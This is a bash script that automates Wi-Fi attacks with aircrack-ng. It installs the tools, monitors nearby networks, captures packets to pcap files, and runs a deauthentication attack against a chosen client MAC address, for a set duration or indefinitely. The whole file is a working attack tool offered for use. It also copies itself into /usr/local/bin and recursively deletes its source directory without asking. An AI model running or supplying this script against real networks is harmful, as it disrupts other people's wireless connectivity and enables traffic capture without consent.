#!/bin/bash

# Author: Datvozer
# Version: 2.0.0
# From: Research Team

log_file="deauth_script.log"

log() {
    echo "$(date +'%Y-%m-%d %H:%M:%S') - $1" | tee -a $log_file
}

log "Checking Internet connection..."
if ! ping -c 1 google.com &> /dev/null; then
    log "No Internet connection. Please check your network and try again."
    exit 1
fi
log "Internet connection is active."
sleep 2

log "Checking for aircrack-ng..."
sleep 2
if ! command -v aircrack-ng &> /dev/null; then
    log "aircrack-ng not found, installing..."
    sudo apt update && sudo apt install -y aircrack-ng
    log "Aircrack-ng installed!"
else
    log "Aircrack-ng is already installed!"
fi
sleep 2

if [[ -z $1 ]]; then
    log "Enter monitoring interface!"
    exit 1
fi

echo "Select mode:"
echo "1. Network Monitoring"
echo "2. Packet Capture"
echo "3. Deauthentication Attack"
read -p "Enter mode number: " mode

case $mode in
    1)
        log "Network Monitoring Mode"
        log "Press CTRL+C to stop"
        sudo airodump-ng $1
        ;;
    2)
        log "Packet Capture Mode"
        read -p "Enter output file name: " output
        log "Capturing packets, press CTRL+C to stop"
        sudo airodump-ng $1 -w $output --output-format pcap
        ;;
    3)
        log "Deauthentication Attack Mode"
        log "Scanning for SSIDs"
        log "Press CTRL+C to stop"
        sleep 2
        sudo airodump-ng $1 -w scan_results --output-format csv &
        sleep 10
        pkill airodump-ng
        log "Scan results saved to scan_results-01.csv"
        sleep 2

        read -p "SSID MAC address: " ssid
        read -p "SSID channel number: " chan
        clear

        log "Initiating target SSID scan, press CTRL+C to stop"
        sleep 2
        sudo airodump-ng -d $ssid -c $chan $1 &
        sleep 10
        pkill airodump-ng
        clear

        read -p "Target MAC address: " targ
        clear

        read -p "Enter duration for deauth attack in seconds (0 for indefinite): " duration
        if [[ $duration -eq 0 ]]; then
            log "Deauthing target indefinitely, press CTRL+C to stop attack..."
            sudo aireplay-ng -0 0 -a $ssid -c $targ $1
        else
            log "Deauthing target for $duration seconds..."
            sudo aireplay-ng -0 0 -a $ssid -c $targ $1 &
            sleep $duration
            pkill aireplay-ng
            log "Deauth attack stopped after $duration seconds."
        fi
        clear
        ;;
    *)
        log "Invalid mode selected!"
        exit 1
        ;;
esac

log "Adding script to /usr/local/bin..."
sleep 2
sudo cp $0 /usr/local/bin/deauth
log "Done, now you can execute 'deauth' from anywhere..."
sleep 2

log "Cleaning up..."
cd ..
sudo rm -rf auto-deauth
log "Done! Execute 'sudo deauth (interface)' from anywhere..."
sleep 2
